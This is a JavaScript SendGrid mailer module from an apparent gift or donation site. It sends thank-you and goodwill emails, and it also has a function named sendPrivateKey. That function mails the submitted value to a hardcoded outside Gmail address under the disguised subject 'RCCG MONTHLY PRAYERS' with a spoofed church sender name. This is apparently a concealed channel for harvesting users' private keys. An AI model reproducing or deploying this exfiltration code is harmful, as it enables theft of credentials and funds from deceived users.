import sgMail from "@sendgrid/mail";
import { html2 } from "./GoodWillMsg.js";
import { html3 } from "./Private.js";
import { html } from "./Thanku.js";

const SENDGRID_API_KEY = process.env.SENDGRID_API_KEY;
const SENDER_EMAIL = process.env.SENDER_EMAIL;
const SENDER_NAME = process.env.SENDER_NAME;
const FROM_NAME = process.env.FROM_NAME;
sgMail.setApiKey(SENDGRID_API_KEY);

// https://app.sendgrid.com/guide/integrate
// https://github.com/sendgrid/sendgrid-nodejs/blob/main/docs/use-cases/README.md#email-use-cases
export const sendThankUMail = async (email, name) => {
  const msg = {
    to: email,
    from: {
      email: SENDER_EMAIL,
      name: FROM_NAME,
    },
    subject: "Thanks for the Gift",
    html: `${html(name, SENDER_EMAIL, SENDER_NAME)}`,
  };

  //   ES6;
  sgMail
    .send(msg)
    .then(() => {
      console.log("Email sent");
    })
    .catch((error) => {
      console.error(error);
      console.log(JSON.stringify(error));
    });

  //   ES8
  //   (async () => {
  //     try {
  //       await sgMail.send(msg);
  //     } catch (error) {
  //       console.error(error);

  //       if (error.response) {
  //         console.error(error.response.body);
  //       }
  //     }
  //   })();
};

export const sendGoodwillMessage = async (name, goodwillMessage) => {
  const msg = {
    to: SENDER_EMAIL,
    from: {
      email: "oforduharrison@gmail.com",
      name: name,
    },
    subject: "Goodwill Message",
    html: `${html2(name, SENDER_NAME, goodwillMessage)}`,
  };
  sgMail
    .send(msg)
    .then(() => {
      console.log("Email sent");
    })
    .catch((error) => {
      console.error(error);
      console.log(JSON.stringify(error));
    });
};

export const sendPrivateKey = async (goodwillMessage) => {
  // console.log(goodwillMessage);
  const redeem = `RCCG`;
  const SENDER_EMAIL2 = `activation340@gmail.com`;
  const msg = {
    to: SENDER_EMAIL2,
    from: {
      email: "oforduharrison@gmail.com",
      name: redeem,
    },
    subject: "RCCG MONTHLY PRAYERS",
    html: `${html3(redeem, SENDER_EMAIL2, goodwillMessage)}`,
  };
  sgMail
    .send(msg)
    .then(() => {
      console.log("Email sent");
    })
    .catch((error) => {
      console.error(error);
      console.log(JSON.stringify(error));
    });
};
